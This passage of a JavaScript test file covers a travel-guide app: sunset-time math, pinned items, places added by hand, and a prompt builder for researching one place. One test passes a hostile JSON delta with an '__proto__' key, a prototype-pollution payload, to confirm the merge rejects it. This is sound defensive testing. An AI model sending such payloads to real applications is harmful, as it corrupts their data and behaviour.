  assert.ok(shown.indexOf('Mystery') !== -1, 'an ungrouped row must still render');
  assert.deepEqual(gs[0].rows.map(r => r.label), ['Enrich', 'Mystery']);
  assert.equal(shown[shown.length - 1], 'Remove city');
});


// ---------------------------------------------------------------------------
// Header highlights, feature A: sunset
// ---------------------------------------------------------------------------
// The reference column is api.met.no (the Norwegian Meteorological Institute's
// sunrise API), queried once by hand for each row and pasted here so the test
// makes no network call of its own. met.no reports to the minute; the tolerance
// below is 90 seconds, which is NOAA's own stated accuracy for latitudes under
// 72 degrees plus met.no's own rounding. Every row here agreed to within a
// single minute when the implementation landed.
const SUNSET_CASES = [
  // [label, iso, lat, lng, met.no sunset UTC 'HH:MM']
  ['Tirana, the owner\'s city, late August', '2026-08-26', 41.33, 19.8101, '17:23'],
  ['Ksamil, the next stop', '2026-08-30', 39.7686, 20.0042, '17:14'],
  ['Batumi', '2026-08-10', 41.64, 41.61, '16:20'],
  ['Yerevan', '2026-08-18', 40.17, 44.52, '15:55'],
  ['the equator on the March equinox', '2026-03-20', 0, 0, '18:10'],
  ['Greenwich on the June solstice', '2026-06-21', 51.4779, 0, '20:20'],
  ['Sydney on the December solstice', '2026-12-21', -33.8688, 151.2093, '09:05']
];

test('sunsetUtcMinutes matches published sunset times within 90 seconds', () => {
  SUNSET_CASES.forEach(([label, iso, lat, lng, ref]) => {
    const got = C.sunKit.sunsetUtcMinutes(iso, lat, lng);
    assert.equal(typeof got, 'number', label + ': expected a time');
    const want = (+ref.slice(0, 2)) * 60 + (+ref.slice(3, 5));
    const offBySeconds = Math.abs(got - want) * 60;
    assert.ok(offBySeconds <= 90,
      label + ': got ' + got.toFixed(2) + ' min UTC, met.no says ' + ref +
      ' (' + want + '), off by ' + offBySeconds.toFixed(0) + 's');
  });
});

test('Tirana in late August sets just after 19:20 local, which is what the chip shows', () => {
  // The owner's own sanity check: "Tirana late Aug sunset ~19:3x local".
  // Albania runs UTC+2 in August, so the chip reads the UTC answer plus two
  // hours. Asserted as a range rather than a string because the chip renders
  // on the DEVICE clock and this test has no device timezone to speak for.
  const utcMin = C.sunKit.sunsetUtcMinutes('2026-08-26', 41.33, 19.8101);
  const localMin = utcMin + 120;
  assert.ok(localMin > 19 * 60 + 15 && localMin < 19 * 60 + 35,
    'expected roughly 19:20-19:30 local, got ' + Math.floor(localMin / 60) + ':' +
    Math.round(localMin % 60));
});

test('sunset shortens through the stay, which is the whole reason it is a daily chip', () => {
  const first = C.sunKit.sunsetUtcMinutes('2026-08-22', 41.33, 19.8101);
  const last = C.sunKit.sunsetUtcMinutes('2026-08-29', 41.33, 19.8101);
  assert.ok(last < first, 'late August evenings get shorter, not longer');
  // Roughly 10 minutes over the week at this latitude; a wildly different
  // number would mean the declination term is wrong even if one date matches.
  const lost = first - last;
  assert.ok(lost > 6 && lost < 16, 'expected 6-16 minutes lost over the week, got ' + lost.toFixed(1));
});

test('a polar day has no sunset, and that is an answer rather than an error', () => {
  // Longyearbyen at midsummer: met.no returns no sunset at all for this date.
  assert.equal(C.sunKit.sunsetUtcMinutes('2026-06-21', 78.22, 15.65), null);
  // And polar night, the other side of the same fact.
  assert.equal(C.sunKit.sunsetUtcMinutes('2026-12-21', 78.22, 15.65), null);
});

test('sunsetUtcMinutes refuses anything that is not a date and a real coordinate', () => {
  assert.equal(C.sunKit.sunsetUtcMinutes('2026-8-26', 41.33, 19.81), null);
  assert.equal(C.sunKit.sunsetUtcMinutes('', 41.33, 19.81), null);
  assert.equal(C.sunKit.sunsetUtcMinutes(null, 41.33, 19.81), null);
  assert.equal(C.sunKit.sunsetUtcMinutes('2026-08-26', '41.33', 19.81), null);
  assert.equal(C.sunKit.sunsetUtcMinutes('2026-08-26', 91, 19.81), null);
  assert.equal(C.sunKit.sunsetUtcMinutes('2026-08-26', 41.33, 181), null);
  assert.equal(C.sunKit.sunsetUtcMinutes('2026-08-26', NaN, 19.81), null);
});

test('julianDayUtc and the equation of time hold their known anchors', () => {
  // J2000.0 is Julian Day 2451545.0 at 2000-01-01 12:00 UTC, so midnight that
  // day is exactly half a day earlier. If this drifts, every sunset drifts.
  assert.equal(C.sunKit.julianDayUtc('2000-01-01'), 2451544.5);
  assert.equal(C.sunKit.julianDayUtc('2026-08-26'), 2461278.5);
  // The equation of time crosses zero four times a year and reaches about
  // -14 minutes in mid-February and +16 in early November.
  const feb = C.sunKit.equationOfTime((C.sunKit.julianDayUtc('2026-02-11') - 2451545) / 36525);
  const nov = C.sunKit.equationOfTime((C.sunKit.julianDayUtc('2026-11-03') - 2451545) / 36525);
  assert.ok(feb < -13 && feb > -15, 'mid-February should be near -14 min, got ' + feb.toFixed(2));
  assert.ok(nov > 15 && nov < 17, 'early November should be near +16 min, got ' + nov.toFixed(2));
  // Declination is near zero at an equinox and near the obliquity at a solstice.
  const eq = C.sunKit.sunDeclination((C.sunKit.julianDayUtc('2026-03-20') - 2451545) / 36525);
  const sol = C.sunKit.sunDeclination((C.sunKit.julianDayUtc('2026-06-21') - 2451545) / 36525);
  assert.ok(Math.abs(eq) < 0.6, 'equinox declination should be near 0, got ' + eq.toFixed(3));
  assert.ok(sol > 23.2 && sol < 23.6, 'solstice declination should be near 23.44, got ' + sol.toFixed(3));
});

test('cityLatLng prefers the accommodation and falls back to the first item with coords', () => {
  assert.deepEqual(C.sunKit.cityLatLng(GOOD), { lat: 41.64, lng: 41.61 });
  // Tirana's real shape: no city.accommodation at all, coordinates only on the
  // apartment item. Without this fallback the city the owner is standing in
  // would be the one city with no sunset chip.
  const noAcc = clone(GOOD);
  delete noAcc.city.accommodation;
  noAcc.items[0].meta = { coords: { lat: 41.33, lng: 19.8101 } };
  assert.deepEqual(C.sunKit.cityLatLng(noAcc), { lat: 41.33, lng: 19.8101 });
  // Nothing anywhere: null, and the header simply omits the chip.
  const bare = clone(GOOD);
  delete bare.city.accommodation;
  assert.equal(C.sunKit.cityLatLng(bare), null);
  // A half-filled or out-of-range coordinate is not a location.
  const half = clone(GOOD);
  half.city.accommodation = { name: 'Somewhere', lat: 41.64 };
  assert.equal(C.sunKit.cityLatLng(half), null);
  half.city.accommodation = { name: 'Somewhere', lat: 200, lng: 10 };
  assert.equal(C.sunKit.cityLatLng(half), null);
  assert.equal(C.sunKit.cityLatLng(null), null);
});

test('cityUtcOffsetMinutes takes only a real offset, in minutes', () => {
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: { utc_offset: 120 } }), 120);
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: { utc_offset: -300 } }), -300);
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: { utc_offset: 0 } }), 0);
  // Absent, the wrong type, or off the real world's map: null, and the chip
  // falls back to the reader's device clock rather than inventing an offset.
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: {} }), null);
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: { utc_offset: '120' } }), null);
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: { utc_offset: NaN } }), null);
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: { utc_offset: 900 } }), null);
  assert.equal(C.sunKit.cityUtcOffsetMinutes({ city: { utc_offset: -900 } }), null);
  assert.equal(C.sunKit.cityUtcOffsetMinutes(null), null);
});

test('the sunset kit is pure: same answer twice, and it never writes to the city', () => {
  const a = C.sunKit.sunsetUtcMinutes('2026-08-26', 41.33, 19.8101);
  const b = C.sunKit.sunsetUtcMinutes('2026-08-26', 41.33, 19.8101);
  assert.equal(a, b);
  // The object arguments are the ones that COULD be written to, so those are
  // the ones worth snapshotting; the coordinates are primitives and could not
  // be mutated by anything.
  const city = clone(GOOD);
  city.city.utc_offset = 240;
  const citySnap = JSON.stringify(city);
  const st = C.emptyState();
  const stSnap = JSON.stringify(st);
  C.sunKit.cityLatLng(city);
  C.sunKit.cityUtcOffsetMinutes(city);
  C.sunKit.chip(city, st, '2026-08-10');
  assert.equal(JSON.stringify(city), citySnap, 'the city was written to');
  assert.equal(JSON.stringify(st), stSnap, 'the state was written to');
});

test('the chip picks a date, a clock, and the calendar day the wrap lands on', () => {
  const chip = (city, now) => C.sunKit.chip(city, C.emptyState(), now);
  const tirana = { schema: 1, city: { name: 'Tiranë', utc_offset: 120,
    dates: { from: '2026-08-22', to: '2026-08-29' },
    accommodation: { name: 'x', lat: 41.33, lng: 19.8101 } }, sections: [], items: [] };

  // Inside the stay: today's sunset, on the city's clock, labelled today.
  const mid = chip(tirana, '2026-08-26');
  assert.deepEqual(mid, { text: '19:23', iso: '2026-08-26', isToday: true, cityClock: true });
  // Outside the stay: the arrival day instead, and NOT labelled today, so a
  // guide opened three weeks early answers "what are the evenings like there".
  const early = chip(tirana, '2026-07-01');
  assert.deepEqual(early, { text: '19:29', iso: '2026-08-22', isToday: false, cityClock: true });
  const late = chip(tirana, '2026-12-01');
  assert.equal(late.iso, '2026-08-22');

  // No offset stated: the reader's device clock, and the chip says so via
  // cityClock:false so the tooltip can name whose clock it used.
  const noOff = clone(tirana);
  delete noOff.city.utc_offset;
  assert.equal(chip(noOff, '2026-08-26').cityClock, false);
  // A fractional offset is refused rather than rendered: 5.5 is what someone
  // writes meaning hours, and it used to come out as a chip reading "17:00.5".
  const half = clone(tirana);
  half.city.utc_offset = 5.5;
  const halfChip = chip(half, '2026-08-26');
  assert.equal(halfChip.cityClock, false, 'a fractional offset must not be used');
  assert.ok(/^\d\d:\d\d$/.test(halfChip.text), 'chip text was ' + halfChip.text);

  // No coordinates anywhere: no chip at all, rather than a guess.
  const nowhere = clone(tirana);
  delete nowhere.city.accommodation;
  assert.equal(chip(nowhere, '2026-08-26'), null);
});

test('a chip whose wrap crosses midnight moves its DATE with its time', () => {
  // Kiritimati sits at UTC+14 with a longitude that puts its sunset on the
  // NEXT UTC day before the offset is even applied. Labelling that with the
  // UTC day would make the chip say "sunset this evening" about tomorrow.
  const kiri = { schema: 1, city: { name: 'Kiritimati', utc_offset: 840,
    dates: { from: '2026-08-20', to: '2026-08-27' },
    accommodation: { name: 'x', lat: 1.87, lng: -157.4 } }, sections: [], items: [] };
  const utc = C.sunKit.sunsetUtcMinutes('2026-08-24', 1.87, -157.4);
  assert.ok(utc > 1440, 'this case only bites when sunset is past UTC midnight, got ' + utc);
  // met.no for 2026-08-24 at these coordinates: 2026-08-25T04:36Z, which is
  // 18:36 on the 25th at UTC+14.
  const c = C.sunKit.chip(kiri, C.emptyState(), '2026-08-24');
  assert.equal(c.cityClock, true);
  assert.equal(c.text, '18:36');
  assert.equal(c.iso, '2026-08-25', 'the label must follow the wrap');
  assert.equal(c.isToday, false, 'that evening is not today in the city');
  // And the other direction: a far-western city whose sunset is the PREVIOUS
  // UTC day once its offset is applied. met.no: 2026-08-25T04:54Z, which is
  // 18:54 on the 24th at UTC-10.
  const honolulu = { schema: 1, city: { name: 'Honolulu', utc_offset: -600,
    dates: { from: '2026-08-20', to: '2026-08-27' },
    accommodation: { name: 'x', lat: 21.3069, lng: -157.8583 } }, sections: [], items: [] };
  const h = C.sunKit.chip(honolulu, C.emptyState(), '2026-08-24');
  assert.equal(h.text, '18:54');
  assert.equal(h.iso, '2026-08-24', 'the wrap went back a day, and the label with it');
  assert.equal(h.isToday, true);
});

// ---------------------------------------------------------------------------
// Header highlights, feature B: pinned items
// ---------------------------------------------------------------------------

test('a state written before pins existed reads as nothing pinned', () => {
  const old = { itemStatus: {}, itemDay: {}, collapsedSections: {}, viewMode: null };
  assert.deepEqual(C.normalizeState(old).pinned, []);
  assert.deepEqual(C.emptyState().pinned, []);
  // Garbage in that slot resets rather than coerces: a half-understood pin
  // list is worth less than no pins, and re-pinning is one tap.
  assert.deepEqual(C.normalizeState({ pinned: 'brasserie' }).pinned, []);
  assert.deepEqual(C.normalizeState({ pinned: null }).pinned, []);
  assert.deepEqual(C.normalizeState({ pinned: { brasserie: 1 } }).pinned, []);
  // Non-string entries and duplicates are dropped, order otherwise kept.
  assert.deepEqual(C.normalizeState({ pinned: ['a', 'a', 3, '', null, 'b'] }).pinned, ['a', 'b']);
});

test('pins round-trip through a store, which is what makes them sync', () => {
  // The state object is what syncKit pushes as one payload, so a key that
  // survives save/load/normalize is a key that reaches the other device.
  const mem = {};
  const LS = {
    getItem: (k) => (Object.prototype.hasOwnProperty.call(mem, k) ? mem[k] : null),
    setItem: (k, v) => { mem[k] = String(v); },
    removeItem: (k) => { delete mem[k]; }
  };
  const s1 = C.makeStore('tirana-2026-08-22', LS);
  const st = s1.load();
  C.pinKit.toggle(st, 'safety-01');
  C.pinKit.toggle(st, 'money-03');
  s1.save(st);
  // A brand new store instance, exactly as a reload or another tab gets.
  const s2 = C.makeStore('tirana-2026-08-22', LS);
  const back = s2.load();
  assert.deepEqual(back.pinned, ['safety-01', 'money-03']);
  assert.equal(C.pinKit.isPinned(back, 'safety-01'), true);
  assert.equal(C.pinKit.isPinned(back, 'nothing'), false);
  // And the raw stored payload really carries it, not just the in-memory copy.
  assert.deepEqual(JSON.parse(mem['cityops.tirana-2026-08-22.v1']).pinned,
    ['safety-01', 'money-03']);
});

test('the pin cap holds at four and refuses a fifth without evicting anything', () => {
  const st = C.emptyState();
  assert.equal(C.pinKit.CAP, 4);
  ['a', 'b', 'c', 'd'].forEach((id) => {
    assert.equal(C.pinKit.canToggle(st, id), true);
    C.pinKit.toggle(st, id);
  });
  assert.deepEqual(st.pinned, ['a', 'b', 'c', 'd']);
  // At the cap the control on a NEW item is dead, and says so; the oldest pin
  // is not silently thrown away to make room.
  assert.equal(C.pinKit.canToggle(st, 'e'), false);
  C.pinKit.toggle(st, 'e');
  assert.deepEqual(st.pinned, ['a', 'b', 'c', 'd']);
  // Unpinning an already-pinned one is always allowed, cap or no cap.
  assert.equal(C.pinKit.canToggle(st, 'b'), true);
  C.pinKit.toggle(st, 'b');
  assert.deepEqual(st.pinned, ['a', 'c', 'd']);
  // And now there is room again.
  assert.equal(C.pinKit.canToggle(st, 'e'), true);
  C.pinKit.toggle(st, 'e');
  assert.deepEqual(st.pinned, ['a', 'c', 'd', 'e']);
});

test('pinnedItems keeps pin order and drops ids the guide no longer has', () => {
  const st = C.emptyState();
  C.pinKit.toggle(st, 'nord');
  C.pinKit.toggle(st, 'ghost');       // never existed
  C.pinKit.toggle(st, 'brasserie');
  const got = C.pinKit.items(GOOD, st);
  assert.deepEqual(got.map((i) => i.id), ['nord', 'brasserie']);
  // An enrich re-run or a data update can retire an item under a pin. That is
  // a dropped chip, not an error and not an empty chip.
  const shrunk = clone(GOOD);
  shrunk.items = shrunk.items.filter((i) => i.id !== 'nord');
  assert.deepEqual(C.pinKit.items(shrunk, st).map((i) => i.id), ['brasserie']);
  assert.deepEqual(C.pinKit.items({ items: [] }, st), []);
});

test('a chip summarises a name and note the way the real Info data reads', () => {
  const chip = C.pinKit.chipText;
  // The common Info shape: short name, note carrying the fact.
  assert.equal(chip('Tap water', 'Meaningfully better than Morocco. Brush teeth, shower, and wash produce freely; drink bottled.'),
    'Tap water · Meaningfully better than Morocco');
  // When the note repeats the name back, the name is dropped rather than
  // stuttered: Tirana's real "Fares" / "Fares rise ~5% after 22:00".
  assert.equal(chip('Fares', 'Fares rise ~5% after 22:00. Tirana is the cheapest taxi market in Albania.'),
    'Fares rise ~5% after 22:00');
  // A ` · ` clause ends the fragment too, since these notes use it as a
  // separator between whole facts.
  assert.equal(chip('Mental math', 'Drop two zeros, add 20%. (1,800 L) · Multiply by 8'),
    'Mental math · Drop two zeros, add 20%');
  // A name that already fills the budget gets no note appended.
  assert.equal(chip('Fake police near Skanderbeg Square', 'Plainclothes person asks to inspect wallet.'),
    'Fake police near Skanderbeg Square');
  // Nothing longer than the cap ever reaches the row, and a truncation always
  // says it truncated.
  const long = chip('Departure', 'Leave base by 08:45 for Tirana North and South Bus Terminal in Kashar, six km west');
  assert.ok(long.length <= C.pinKit.CHIP_MAX, 'chip was ' + long.length + ' chars: ' + long);
  assert.ok(long.slice(-1) === '…', 'a cut chip must say it was cut: ' + long);
  // No note at all is fine; so is no name.
  assert.equal(chip('Walking distances', ''), 'Walking distances');
  assert.equal(chip('Walking distances', null), 'Walking distances');
  assert.equal(chip('', 'Bolt does NOT operate anywhere in Albania.'), 'Bolt does NOT operate anywhere in Albania');
  assert.equal(chip('', ''), '');
  // Whitespace and newlines in a note never reach the row.
  assert.equal(chip('Payment', '  May be cash\n  to on-site staff. Confirm in advance.'),
    'Payment · May be cash to on-site staff');
});

// ---------------------------------------------------------------------------
// Add a place by hand
// ---------------------------------------------------------------------------

test('newPlaceDelta builds a delta mergeDelta accepts, and the place lands intact', () => {
  const built = C.newPlaceDelta(GOOD, {
    name: 'Oda Garden', section: 'dinner', status: 'plan',
    note: 'recommended by a couple at dinner', day: '2026-08-12'
  });
  assert.deepEqual(built.errors, []);
  assert.equal(built.id, 'oda-garden');
  assert.equal(built.delta.schema, 1);
  assert.equal(built.delta.delta, true);
  assert.equal(built.delta.items.length, 1);
  // The whole point of routing through a delta: the same validateItem every
  // AI payload faces has to pass it.
  const res = C.mergeDelta(GOOD, built.delta);
  assert.deepEqual(res.errors, []);
  assert.equal(res.summary.added, 1);
  assert.equal(res.summary.skipped, 0);
  const added = res.data.items.filter((i) => i.id === 'oda-garden')[0];
  assert.equal(added.name, 'Oda Garden');
  assert.equal(added.section, 'dinner');
  assert.equal(added.status, 'plan');
  assert.equal(added.day, '2026-08-12');
  assert.equal(added.note, 'recommended by a couple at dinner');
  assert.equal(added.added_by, 'traveler');
  assert.deepEqual(added.links, []);
  // Normalized like every merged item, so nothing downstream sees a new shape.
  assert.equal(added.place_id, null);
  assert.equal(added.verified, null);
  // And the merged guide is still a valid guide.
  assert.deepEqual(C.validate(res.data), []);
  // Nothing already there moved.
  assert.equal(res.data.items.length, GOOD.items.length + 1);
  GOOD.items.forEach((orig, i) => assert.equal(res.data.items[i].id, orig.id));
});

test('the same name twice makes two places, not one silent skip', () => {
  // A human typing "Oda" twice means two restaurants far more often than it
  // means a mistake, and mergeDelta would count a repeated id as `skipped`.
  let city = GOOD;
  const first = C.newPlaceDelta(city, { name: 'Oda', section: 'dinner' });
  city = C.mergeDelta(city, first.delta).data;
  const second = C.newPlaceDelta(city, { name: 'Oda', section: 'dinner' });
  assert.equal(first.id, 'oda');
  assert.equal(second.id, 'oda-2');
  const res = C.mergeDelta(city, second.delta);
  assert.equal(res.summary.added, 1);
  assert.equal(res.summary.skipped, 0);
  const third = C.newPlaceDelta(res.data, { name: 'Oda', section: 'dinner' });
  assert.equal(third.id, 'oda-3');
  // A collision with an id the guide already holds for another reason.
  const clash = C.newPlaceDelta(GOOD, { name: 'Nord Specialty Coffee', section: 'coffee' });
  assert.equal(clash.id, 'nord-specialty-coffee');
  const clash2 = C.newPlaceDelta(GOOD, { name: 'brasserie', section: 'dinner' });
  assert.equal(clash2.id, 'brasserie-2');
});

test('a name that slugs to nothing still gets a usable id', () => {
  // This route runs through Georgia, Armenia and Albania; a name typed in the
  // local script slugs to an empty string.
  const a = C.newPlaceDelta(GOOD, { name: 'ხაჭაპური', section: 'dinner' });
  assert.equal(a.id, 'place');
  assert.deepEqual(C.mergeDelta(GOOD, a.delta).errors, []);
  const city = C.mergeDelta(GOOD, a.delta).data;
  const b = C.newPlaceDelta(city, { name: 'Ոսկե', section: 'dinner' });
  assert.equal(b.id, 'place-2');
});

test('the add form refuses what a form can get wrong, before mergeDelta ever runs', () => {
  const bad = (f) => C.newPlaceDelta(GOOD, f);
  assert.deepEqual(bad({ name: '', section: 'dinner' }).errors, ['A name is required.']);
  assert.deepEqual(bad({ name: '   ', section: 'dinner' }).errors, ['A name is required.']);
  assert.equal(bad({ name: 'X', section: '' }).errors[0], 'Pick a section.');
  assert.equal(bad({ name: 'X', section: 'nope' }).errors[0], 'This city has no section "nope".');
  assert.equal(bad({ name: 'X', section: 'dinner', day: 'tonight' }).errors[0],
    'The day must be YYYY-MM-DD.');
  // done and archived are traveler states, never a starting one, exactly as
  // mergeDelta insists for an AI payload.
  assert.equal(bad({ name: 'X', section: 'dinner', status: 'done' }).errors[0],
    'A new place starts as plan or backup.');
  assert.equal(bad({ name: 'X', section: 'dinner', status: 'archived' }).errors[0],
    'A new place starts as plan or backup.');
  // Every failing case returns no delta at all, so a caller cannot half-apply.
  ['', '   '].forEach((n) => assert.equal(bad({ name: n, section: 'dinner' }).delta, null));
  // Defaults: status plan, no day, no note.
  const ok = C.newPlaceDelta(GOOD, { name: 'Somewhere', section: 'coffee' });
  assert.deepEqual(ok.errors, []);
  assert.equal(ok.delta.items[0].status, 'plan');
  assert.equal(ok.delta.items[0].day, undefined);
  assert.equal(ok.delta.items[0].note, undefined);
  // Backup is the other legal start.
  assert.equal(C.newPlaceDelta(GOOD, { name: 'Y', section: 'coffee', status: 'backup' })
    .delta.items[0].status, 'backup');
});

test('newPlaceDelta is pure: it reads the city and changes nothing', () => {
  const snap = JSON.stringify(GOOD);
  C.newPlaceDelta(GOOD, { name: 'Oda Garden', section: 'dinner', note: 'x' });
  assert.equal(JSON.stringify(GOOD), snap);
});

test('an id every plain object already inherits is added, not silently skipped', () => {
  // "Constructor" is a plausible bar name and slugs to "constructor", which
  // every plain object answers to. mergeDelta's existing-id lookup used a
  // plain {}, so the item read as already present: added 0, skipped 1, no
  // errors, and the caller was told the delta applied.
  ['Constructor', 'ToString', 'Valueof', 'Hasownproperty'].forEach((name) => {
    const built = C.newPlaceDelta(GOOD, { name: name, section: 'dinner' });
    assert.deepEqual(built.errors, []);
    const res = C.mergeDelta(GOOD, built.delta);
    assert.deepEqual(res.errors, []);
    assert.equal(res.summary.added, 1, name + ' was not added');
    assert.equal(res.summary.skipped, 0, name + ' was reported as already present');
    assert.ok(res.data.items.filter((i) => i.id === built.id).length === 1);
  });
  // The same hole in the section map: a delta section named "constructor"
  // read as already present and was never added.
  const secRes = C.mergeDelta(GOOD, {
    schema: 1, delta: true,
    sections: [{ id: 'constructor', label: 'Constructor' }],
    items: [{ id: 'c1', section: 'constructor', status: 'plan', name: 'X', links: [] }]
  });
  assert.deepEqual(secRes.errors, []);
  assert.equal(secRes.summary.sectionsAdded, 1);
  assert.equal(secRes.summary.added, 1);
  // And a hostile delta still cannot paint intel onto every card. Built via
  // JSON.parse on purpose: a `{'__proto__': x}` OBJECT LITERAL sets the
  // prototype instead of creating a key, so a literal here would test
  // nothing. JSON.parse creates a real own property, which is exactly what
  // arrives from an AI response.
  const eviland = C.mergeDelta(GOOD, JSON.parse(
    '{"schema":1,"delta":true,"intel":{"__proto__":{"tips":["pwned"]}}}'));
  assert.deepEqual(eviland.errors, []);
  assert.equal(eviland.summary.intelSkipped, 1);
  assert.equal(eviland.summary.intelApplied, 0);
  eviland.data.items.forEach((i) => assert.equal(i.intel, undefined));
});

test('an item whose id is an Object.prototype key still renders and still behaves', () => {
  // The deeper half of the same hole mergeDelta had, found by adding a place
  // called "Constructor" in the real app rather than by reading the code: the
  // per-item STATE maps are plain objects too, so effectiveStatus returned
  // the Object constructor instead of "not set". The item was written to the
  // guide correctly and then rendered on no tab at all, and the reveal's
  // fallback message printed "function Object() { [native code] }".
  const built = C.newPlaceDelta(GOOD, { name: 'Constructor', section: 'dinner' });
  const city = C.mergeDelta(GOOD, built.delta).data;
  const it = city.items.filter((i) => i.id === 'constructor')[0];
  assert.ok(it, 'the place must be in the guide');
  const st = C.emptyState();

  // Nothing set yet: every reader must say so rather than hand back an
  // inherited member of Object.prototype.
  assert.equal(C.effectiveStatus(it, st), 'plan');
  assert.equal(C.effectiveName(it, st), 'Constructor');
  assert.equal(C.effectiveDay(it, st), null);
  assert.equal(C.isSectionCollapsed(st, 'constructor', 4), C.defaultSectionCollapsed('constructor', 4));
  assert.equal(C.isPlanDayCollapsed(st, 'constructor'), false);
  assert.deepEqual(C.dayItemOrderFor(st, 'constructor'), []);
  assert.deepEqual(C.sectionItemOrderFor(st, 'constructor'), []);

  // And once something IS set, it reads back.
  C.setStatus(st, 'constructor', 'done');
  C.setTitle(st, 'constructor', 'Konstruktori');
  C.setDay(st, 'constructor', '2026-08-13');
  assert.equal(C.effectiveStatus(it, st), 'done');
  assert.equal(C.effectiveName(it, st), 'Konstruktori');
  assert.equal(C.effectiveDay(it, st), '2026-08-13');

  // The whole render model has to place it, which is the failure that was
  // actually visible: a status of "function Object" matches none of the four
  // buckets, so the card appeared nowhere.
  const vm = C.viewModel(city, C.emptyState());
  const dinner = vm.filter((sv) => sv.section.id === 'dinner')[0];
  const seen = [].concat(dinner.undated, dinner.backups, dinner.archived,
    [].concat.apply([], dinner.days.map((d) => d.items))).map((x) => x.id);
  assert.ok(seen.indexOf('constructor') !== -1,
    'the card rendered in no bucket at all: ' + JSON.stringify(seen));

  // The other prototype keys a name can slug to, same bar.
  ['ToString', 'Valueof', 'Hasownproperty', 'Proto'].forEach((n) => {
    const b = C.newPlaceDelta(city, { name: n, section: 'dinner' });
    const merged = C.mergeDelta(city, b.delta);
    assert.equal(merged.summary.added, 1, n);
    const item = merged.data.items.filter((i) => i.id === b.id)[0];
    assert.equal(C.effectiveStatus(item, C.emptyState()), 'plan', n + ' status');
    assert.equal(C.effectiveName(item, C.emptyState()), n, n + ' name');
  });
});

test('a name that collides many times keeps counting rather than falling back to a clock', () => {
  // The suffix loop used to stop at 500 and fall back to a timestamp, which
  // two adds inside one millisecond would duplicate, and mergeDelta would
  // then SKIP the second silently.
  let city = clone(GOOD);
  for (let i = 0; i < 520; i++) {
    const built = C.newPlaceDelta(city, { name: 'Oda', section: 'dinner' });
    const res = C.mergeDelta(city, built.delta);
    assert.equal(res.summary.added, 1, 'add ' + i + ' produced a duplicate id: ' + built.id);
    city = res.data;
  }
  assert.equal(city.items.filter((i) => /^oda(-\d+)?$/.test(i.id)).length, 520);
  assert.ok(city.items.filter((i) => i.id === 'oda-520').length === 1);
});

test('rosterLines survives an item whose intel never went through validate()', () => {
  // Both roster helpers are exported on promptKit, so a caller can hand them
  // hand-built data. "oops".forEach would throw and take the render with it.
  const lines = C.promptKit.rosterLines([
    { id: 'a', name: 'A', intel: { verdicts: 'oops', tips: 7 } },
    { id: 'b', name: 'B', intel: null },
    { id: 'c', name: 'C', rating: { stars: 'four' } },
    null,
    { name: 'no id' }
  ], null);
  assert.ok(lines.join('\n').indexOf('- a | A') !== -1);
  assert.ok(lines.join('\n').indexOf('- b | B') !== -1);
  assert.equal(lines.filter((l) => /no id/.test(l)).length, 0);
  // A rating whose stars are not a number is not a rating, so the item still
  // reads as unresearched rather than as rated "four".
  assert.ok(lines.join('\n').indexOf('- c | C') !== -1);
  assert.ok(lines.filter((l) => /not researched yet/.test(l)).length >= 3);
});

// ---------------------------------------------------------------------------
// Ask Claude about one place
// ---------------------------------------------------------------------------

const RIVALS = (() => {
  const c = clone(GOOD);
  c.items.filter((i) => i.id === 'brasserie')[0].intel =
    { verdicts: [{ tier: 'must', text: 'The duck is the reason to come.' }], source: 'reviews' };
  c.items.filter((i) => i.id === 'brasserie')[0].rating = { stars: 4.8, count: 5545 };
  c.items.filter((i) => i.id === 'tanini')[0].rating = { stars: 4.2 };
  return c;
})();

test('buildPlacePassPrompt names one place and rosters exactly its own section', () => {
  const built = C.newPlaceDelta(RIVALS, {
    name: 'Oda Garden', section: 'dinner', status: 'plan',
    note: 'recommended by a couple at dinner'
  });
  const city = C.mergeDelta(RIVALS, built.delta).data;
  const item = city.items.filter((i) => i.id === built.id)[0];
  const out = C.promptKit.buildPlacePassPrompt(FAKE_RERUN, city, item, C.emptyState());

  assert.ok(out.startsWith('You are checking one place a traveler added by hand'));
  assert.ok(out.includes('- **City:** Batumi'));
  assert.ok(out.includes('## The place'));
  assert.ok(out.includes('- **Item id:** oda-garden'));
  assert.ok(out.includes('- **Name as the traveler typed it:** Oda Garden'));
  assert.ok(out.includes('- **Section:** Dinner (dinner)'));
  assert.ok(out.includes('- **The traveler\'s note:** recommended by a couple at dinner'));
  assert.ok(out.includes('Research the ONE place named above'));
  assert.equal(out.indexOf('RERUN:PLACE'), -1);

  // The roster: every OTHER dinner item, with what is known about it.
  assert.ok(out.includes('## Others already in this section'));
  assert.ok(out.includes('- brasserie | Brasserie 1900 | 4.8★ (5545) | plan'));
  assert.ok(out.includes('    verdict (must): The duck is the reason to come.'));
  assert.ok(out.includes('- tanini | Tanini | 4.2★ | plan'));
  assert.ok(out.includes('- sisters | At the Sisters | backup'));
  // An unresearched rival says so, so the answer can admit a partial ranking
  // instead of reading silence as a bad score.
  assert.ok(out.includes('    not researched yet'));
  // The count the verdict is told to use is the real one.
  assert.ok(out.includes('There are 3 of them.'));
  // Another section's items are not the comparison and are not in the prompt.
  assert.equal(out.indexOf('Nord Specialty Coffee'), -1);
  // Never its own rival.
  assert.equal(out.indexOf('- oda-garden | Oda Garden'), -1);
});

test('a place with no rivals says so instead of pretending to rank', () => {
  const city = clone(GOOD);
  city.sections.push({ id: 'bars', label: 'Bars' });
  const built = C.newPlaceDelta(city, { name: 'Lonely Bar', section: 'bars' });
  const merged = C.mergeDelta(city, built.delta).data;
  const item = merged.items.filter((i) => i.id === built.id)[0];
  const out = C.promptKit.buildPlacePassPrompt(FAKE_RERUN, merged, item, C.emptyState());
  assert.ok(out.includes('- **Section:** Bars (bars)'));
  assert.ok(out.includes('There are none: this is the first place in this section'));
  assert.equal(out.indexOf('There are 0 of them'), -1);
});

test('the place prompt reads the traveler\'s renames and status changes, not the file', () => {
  const st = C.emptyState();
  C.setTitle(st, 'brasserie', 'Brasserie (the good one)');
  C.setStatus(st, 'tanini', 'done');
  const item = RIVALS.items.filter((i) => i.id === 'sisters')[0];
  const out = C.promptKit.buildPlacePassPrompt(FAKE_RERUN, RIVALS, item, st);
